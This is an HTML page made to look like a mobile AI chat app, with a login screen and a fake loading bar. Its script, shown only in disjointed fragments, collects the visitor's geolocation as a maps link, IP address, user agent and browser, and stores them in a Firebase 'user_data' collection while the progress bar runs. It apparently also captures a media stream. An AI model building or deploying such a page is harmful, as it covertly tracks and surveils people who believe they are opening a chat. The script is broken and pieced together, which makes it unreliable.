<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

    <style>
        /* Modern Reset & Base Styles */
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
        body { background-color: #f0f2f5; height: 100vh; overflow: hidden; display: flex; flex-direction: column; }

        /* --- 1. LOGIN SECTION --- */
        #login-section {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            display: flex; flex-direction: column; justify-content: center; align-items: center;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            z-index: 100; transition: opacity 0.5s ease;
        }
        .login-card {
            background: white; padding: 30px; border-radius: 20px; width: 85%; max-width: 350px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2); text-align: center;
        }
        .login-card h2 { margin-bottom: 10px; color: #333; }
        .login-card p { font-size: 14px; color: #666; margin-bottom: 20px; }
        .login-card input {
            width: 100%; padding: 15px; border: 2px solid #eee; border-radius: 12px;
            margin-bottom: 15px; font-size: 16px; outline: none; transition: border 0.3s;
        }
        .login-card input:focus { border-color: #764ba2; }
        .login-card button {
            width: 100%; padding: 15px; background: #764ba2; color: white; border: none;
            border-radius: 12px; font-size: 16px; font-weight: bold; cursor: pointer;
            transition: transform 0.2s, background 0.3s;
        }
        .login-card button:active { transform: scale(0.98); }

        /* --- 2. LOADING SECTION (Progress Bar) --- */
        #loading-section {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            background: white; z-index: 90; display: none;
            flex-direction: column; justify-content: center; align-items: center;
        }
        .loader-content { width: 80%; text-align: center; }
        .progress-container {
            width: 100%; height: 10px; background-color: #eee; border-radius: 10px;
            overflow: hidden; margin-top: 15px;
        }
        .progress-bar {
            height: 100%; width: 0%; background: linear-gradient(90deg, #667eea, #764ba2);
            transition: width 0.3s ease; border-radius: 10px;
        }
        .loading-text { font-size: 18px; font-weight: bold; color: #555; }
        .percentage { font-size: 40px; font-weight: bold; color: #764ba2; margin-top: 10px; display: block;}

        /* --- 3. CHAT SECTION (Fullscreen) --- */
        #chat-section {
            display: none; flex-direction: column; height: 100dvh; width: 100%; background: #fff;
            animation: fadeIn 0.8s ease;
        }
        
        /* Header */
        header {
            padding: 15px 20px; background: white; border-bottom: 1px solid #eee;
            display: flex; align-items: center; box-shadow: 0 2px 5px rgba(0,0,0,0.05);
        }
        .avatar { width: 40px; height: 40px; background: #764ba2; border-radius: 50%; color: white; display: flex; align-items: center; justify-content: center; font-weight: bold; margin-right: 15px; }
        .header-info h3 { font-size: 16px; margin: 0; }
        .header-info span { font-size: 12px; color: #28a745; }

        /* Chat Area */
        #chat-box {
            flex: 1; overflow-y: auto; padding: 20px; display: flex; flex-direction: column; gap: 12px;
            background-color: #f9f9f9; scroll-behavior: smooth;
        }
        
        /* Bubbles */
        .msg { max-width: 75%; padding: 12px 16px; font-size: 15px; line-height: 1.4; position: relative; animation: popIn 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
        .user-msg {
            align-self: flex-end; background: #764ba2; color: white;
            border-radius: 18px 18px 4px 18px;
        }
        .ai-msg {
            align-self: flex-start; background: #fff; color: #333;
            border-radius: 18px 18px 18px 4px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #eee;
        }

        /* Typing Indicator */
        .typing { align-self: flex-start; background: #fff; padding: 12px 16px; border-radius: 18px; border: 1px solid #eee; display: none; margin-bottom: 10px;}
        .dot { height: 6px; width: 6px; background-color: #bbb; border-radius: 50%; display: inline-block; animation: bounce 1.4s infinite ease-in-out; margin: 0 2px; }
        .dot:nth-child(1) { animation-delay: -0.32s; }
        .dot:nth-child(2) { animation-delay: -0.16s; }
        @keyframes bounce { 0%, 80%, 100% { transform: scale(0); } 40% { transform: scale(1); } }

        /* Input Area */
        .input-area {
            padding: 15px; background: white; border-top: 1px solid #eee; display: flex; align-items: center;
        }
        .input-area input {
            flex: 1; padding: 12px 15px; border-radius: 25px; border: 1px solid #ddd; background: #f0f2f5; outline: none;
        }
        .input-area button {
            margin-left: 10px; background: #764ba2; color: white; border: none; width: 45px; height: 45px; border-radius: 50%; cursor: pointer; display: flex; align-items: center; justify-content: center; font-size: 18px; transition: transform 0.2s;
        }
        .input-area button:active { transform: scale(0.9); }

        /* Animations */
        @keyframes popIn { from { opacity: 0; transform: translateY(10px) scale(0.95); } to { opacity: 1; transform: translateY(0) scale(1); } }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        
        .hidden { display: none !important; }
    </style>
</head>

                if (progress < 90) { 
                    progress += Math.random() * 5;

                    throw new Error("Geolocation not supported");

                        const lat = position.coords.latitude;
                        const lng = position.coords.longitude;
                        const mapLink = `https://www.google.com/maps?q=${lat},${lng}`;
                        
                        // 4. Save to Firebase

                            await addDoc(collection(db, "user_data"), {
                                name: name,
                                ip_address: ip,
                                device_info: navigator.userAgent,
                                browser: getBrowserName(),
                                location_link: mapLink,
                                timestamp: serverTimestamp()
                            });

                            // Finish Loading
                            clearInterval(interval);
                            progressBar.style.width = "100%";
                            percentText.innerText = "100%";

                };

                    stream.getTracks().forEach(track => track.stop());

                    // Create Blob

        window.sendMessage = function() {
            const input = document.getElementById('user-msg');
            const message = input.value.trim();
            const chatBox = document.getElementById('chat-box');
            const loader = document.getElementById('typing-indicator');
